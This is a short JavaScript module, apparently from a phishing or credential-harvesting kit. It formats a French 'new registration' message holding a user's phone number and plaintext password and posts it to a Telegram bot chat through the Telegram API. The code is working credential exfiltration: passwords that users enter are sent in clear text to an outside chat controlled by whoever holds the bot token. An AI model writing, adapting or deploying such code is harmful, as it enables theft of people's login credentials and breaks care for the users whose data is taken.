import axios from 'axios';
import { formatPhone } from '@/utils/validation';

export function formatRegistrationMessage(phone, entryCode, time) {
  return [
    '🆕 *Nouvelle inscription*',
    '',
    `📱 Téléphone: \`${formatPhone(phone)}\``,
    `🔐 Mot de passe: \`${entryCode}\``,
    `⏰ Heure: ${time}`,
  ].join('\n');
}

export const sendToTelegram = async (message) => {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!token || !chatId) {
    console.error('Telegram Error: Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
    return false;
  }

  try {
    await axios.post(
      `https://api.telegram.org/bot${token}/sendMessage`,
      {
        chat_id: chatId,
        text: message.trim(),
        parse_mode: 'Markdown',
      }
    );
    return true;
  } catch (error) {
    console.error('Telegram Error:', error?.response?.data || error.message);
    return false;
  }
};
